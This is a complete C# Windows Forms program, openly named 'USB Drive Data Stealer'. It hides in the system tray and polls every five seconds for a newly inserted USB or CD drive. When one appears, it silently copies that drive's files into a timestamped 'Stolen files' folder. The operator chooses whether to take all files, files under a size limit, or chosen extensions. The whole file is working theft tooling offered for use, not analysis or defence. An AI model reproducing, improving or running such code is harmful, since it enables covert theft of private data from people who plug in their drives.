using System;
using System.Linq; // Contains() | OfType<type>() | IsLetterOrDigit
using System.Windows.Forms;
using System.IO;

namespace USBDriveDataStealer
{
    public partial class FrmConfig : Form
    {
        DriveInfo[] initalDrives;
        NotifyIcon trayIcon;

        public FrmConfig()
        {
            InitializeComponent();
        }

        private void FrmConfig_Load(object sender, EventArgs e)
        {
            RBmaxSize.Checked = true; // default choice
            TXTpath.Text = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); // default save folder

            // Traybar icon management
            trayIcon = new NotifyIcon();
            trayIcon.Icon = Properties.Resources.Icon;
            trayIcon.Text = "USB Drive Data Stealer"; // shown when the cursor is over the icon
            trayIcon.Click += trayIconClicked; // makes the form visible again
        }

        private void RBall_CheckedChanged(object sender, EventArgs e)
        {
            if (RBall.Checked == true)
            {
                LBextensions.Enabled = false;
                TXTextension.Enabled = false;
                BTNaddExtension.Enabled = false;
                BTNremoveExtension.Enabled = false;
            }
        }

        private void RBmaxSize_CheckedChanged(object sender, EventArgs e)
        {
            if (RBmaxSize.Checked == true)
            {
                NUDsize.Value = 5; // default value
                NUDsize.Enabled = true;

                LBextensions.Enabled = false;
                TXTextension.Enabled = false;
                BTNaddExtension.Enabled = false;
                BTNremoveExtension.Enabled = false;
            }
            else
            {
                NUDsize.Value = 5; // restore the default value
                NUDsize.Enabled = false;
            }
        }

        private void RBextensions_CheckedChanged_1(object sender, EventArgs e)
        {
            LBextensions.Enabled = true;
            TXTextension.Enabled = true;
            BTNaddExtension.Enabled = true;
            BTNremoveExtension.Enabled = true;
        }

        private void BTNaddExtension_Click(object sender, EventArgs e)
        {
            if(TXTextension.Text == "" || TXTextension.Text.All(char.IsLetterOrDigit) == false)
            {
                MessageBox.Show("You must enter at least one character, and all characters must be alphanumeric.", "Bad extension format", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            LBextensions.Items.Add(TXTextension.Text.ToUpper());
            LBextensions.SelectedIndex = -1;
            TXTextension.Clear();
        }

        private void BTNremoveExtension_Click(object sender, EventArgs e)
        {
            if (LBextensions.Items.Count == 1)
            {
                MessageBox.Show("You must enter at least one extension.", "Non-deletable extension", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                LBextensions.SelectedIndex = -1;
                return;
            }

            if (LBextensions.SelectedIndex != -1)
            {
                LBextensions.Items.Remove(LBextensions.SelectedItem);
                LBextensions.SelectedIndex = -1;
            }
            else
            {
                MessageBox.Show("You didn't select the extension to remove.", "No extension selected", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }

        private void BTNpath_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog fbd = new FolderBrowserDialog();
            fbd.Description = "Where do you want to save the stolen files?";
            fbd.ShowNewFolderButton = false; // the user can't create new folders via the FolderBrowserDialog
            fbd.RootFolder = Environment.SpecialFolder.MyComputer; // default folder (when the user want to change the path)

            DialogResult dr = fbd.ShowDialog();

            if (dr == DialogResult.OK) // the user has selected a folder
                TXTpath.Text = fbd.SelectedPath;
        }

        private void BTNwait_Click(object sender, EventArgs e)
        {
            initalDrives = DriveInfo.GetDrives(); // list of all currently connected drives

            // disable all components except BTNstop
            RBall.Enabled = false;
            RBmaxSize.Enabled = false;
            NUDsize.Enabled = false;
            RBextensions.Enabled = false;
            LBextensions.Enabled = false;
            TXTextension.Enabled = false;
            BTNaddExtension.Enabled = false;
            BTNremoveExtension.Enabled = false;
            TXTpath.Enabled = false;
            BTNpath.Enabled = false;
            BTNwait.Enabled = false;

            TMRwaitForDrive.Enabled = true; // every 5 seconds it will check if a new drive has been connected
            BTNstop.Enabled = true;
            
            // hide the form, show the app icon in the traybar and show a balloontip to notify the user
            this.WindowState = FormWindowState.Minimized;
            trayIcon.Visible = true;
            trayIcon.ShowBalloonTip(3000, "USB Drive Data Stealer", "Waiting for USB Drive connection...", ToolTipIcon.Info);
        }

        private void BTNstop_Click(object sender, EventArgs e)
        {
            // stop the timer and restore the GUI components
            TMRwaitForDrive.Enabled = false;

            RBall.Enabled = true;
            RBmaxSize.Enabled = true;
            NUDsize.Enabled = true;
            RBextensions.Enabled = true;
            RBmaxSize.Checked = true;
            TXTpath.Enabled = true;
            BTNpath.Enabled = true;
            BTNstop.Enabled = false;
            BTNwait.Enabled = true; 
        }

        private void trayIconClicked(object sender, EventArgs e)
        {
            // hide de trayicon and show the form
            trayIcon.Visible = false;
            this.WindowState = FormWindowState.Normal;
        }

        private void TMRwaitForDrive_Tick(object sender, EventArgs e)
        {
            /*
                every 5 seconds check if a new drive has been connected.
                if yes, if it is a CD or removable drive and is ready to be accessed,
                the data on it is copied to the folder selected by the user,
                according to the preferences specified.
                in case of an error during copying, the file _CrashReport.txt containing
                the error information is created (in the folder specified by the user).
            */

            DriveInfo[] currentDrives = DriveInfo.GetDrives(); // list of all currently connected drives

            if (currentDrives.Length > initalDrives.Length) // if there is one more than those counted before -> new drive connected!
            {
                DriveInfo newDrive = currentDrives[currentDrives.Length - 1]; // usually the drive that is just connected is the last one on the list

                if (newDrive.DriveType == DriveType.Removable || newDrive.DriveType == DriveType.CDRom) // i'm interested only in removable and CD\DVD drive
                {
                    if (newDrive.IsReady) // if the connected drive is ready to be accessed
                    {
                        // stop the timer and update the form components
                        TMRwaitForDrive.Enabled = false;
                        BTNstop.Enabled = false;
                        BTNwait.Text = "USB DRIVE CONNECTED...";
                        BTNstop.Text = "COPYING FILES...";
                        PBcopying.Style = ProgressBarStyle.Marquee;
                        PBcopying.MarqueeAnimationSpeed = 15;

                        string saveFolderName = DateTime.Now.ToString("yyyy-MM-dd_HH.mm.ss") + " - Stolen files"; // creates a unique folder inside the one specified by the user
                        string saveFolderPath = TXTpath.Text + "\\" + saveFolderName;

                        // the driver's data is copied to the folder selected by the user, according to the preferences specified
                        try
                        {
                            Directory.CreateDirectory(saveFolderPath);

                            if (RBall.Checked) // all files
                            {
                                copyAllFiles(newDrive.RootDirectory.FullName, saveFolderPath);
                            }
                            else if (RBmaxSize.Checked) // all files smaller than the size specified by the user
                            {
                                copySmallFiles(newDrive.RootDirectory.FullName, saveFolderPath, 1024 * 1024 * (int)NUDsize.Value);
                            }
                            else // (RBextensions.Checked) - all files having an extension specified by the user
                            {
                                string[] acceptedExtensions = LBextensions.Items.OfType<string>().ToArray();

                                /*
                                    I add the dot to user-specified extensions to make them compatible
                                    with the file.Extension() method used in the copySpecificFiles() function
                                */
                                for (int i = 0; i < acceptedExtensions.Length; i++)
                                    acceptedExtensions[i] = "." + acceptedExtensions[i];

                                copySpecificFiles(newDrive.RootDirectory.FullName, saveFolderPath, acceptedExtensions);
                            }
                        }
                        catch (Exception ex) // in case of an error during copying, generate the _CrashReport.txt to get error information
                        {

                            try
                            {
                                using (StreamWriter sw = File.CreateText(saveFolderPath + "\\" + "_CrashReport.txt"))
                                {
                                    sw.WriteLine("Error description:\n" + ex.Message);
                                }
                            }
                            catch (Exception) { } // any exceptions from the _CrashReport.txt file generation aren't handled
                        }
                        finally // terminates the program when the copying of files is finished
                        {
                            trayIcon.Visible = false;
                            Application.Exit();
                        }
                    }
                }
            }
        }

        private void copyAllFiles(string src, string dest)
        {
            DirectoryInfo di_src = new DirectoryInfo(src);
            DirectoryInfo di_dest = new DirectoryInfo(dest);

            // copy all files in the current directory
            foreach (FileInfo file in di_src.GetFiles())
            {
                file.CopyTo(Path.Combine(di_dest.FullName, file.Name), true);
            }

            // copy all subdirectories
            foreach (DirectoryInfo subDir in di_src.GetDirectories())
            {
                DirectoryInfo newDest = di_dest.CreateSubdirectory(subDir.Name);
                copyAllFiles(subDir.FullName, newDest.FullName);
            }
        }

        private void copySmallFiles(string src, string dest, long maxMB)
        {
            DirectoryInfo di_src = new DirectoryInfo(src);
            DirectoryInfo di_dest = new DirectoryInfo(dest);

            // copy all files in the current directory having the size <= maxMB 
            foreach (FileInfo file in di_src.GetFiles())
            {
                if (file.Length <= maxMB)
                {
                    file.CopyTo(Path.Combine(di_dest.FullName, file.Name), true);
                }
            }

            // copy all subdirectories
            foreach (DirectoryInfo subDir in di_src.GetDirectories())
            {
                DirectoryInfo newDest = di_dest.CreateSubdirectory(subDir.Name);
                copySmallFiles(subDir.FullName, newDest.FullName, maxMB);
            }
        }

        private void copySpecificFiles(string src, string dest, string[] acceptedExtensions)
        {
            DirectoryInfo di_src = new DirectoryInfo(src);
            DirectoryInfo di_dest = new DirectoryInfo(dest);

            // copy all files in the current directory having an extension specified by the user
            foreach (FileInfo file in di_src.GetFiles())
            {
                if (acceptedExtensions.Contains(file.Extension.ToUpper())) // ToUpper() because Contains() is case sensitive and accepted extensions ar all uppercase
                {
                    file.CopyTo(Path.Combine(di_dest.FullName, file.Name), true);
                }
            }

            // copy all subdirectories
            foreach (DirectoryInfo subDir in di_src.GetDirectories())
            {
                DirectoryInfo newDest = di_dest.CreateSubdirectory(subDir.Name);
                copySpecificFiles(subDir.FullName, newDest.FullName, acceptedExtensions);
            }
        }

    }
}
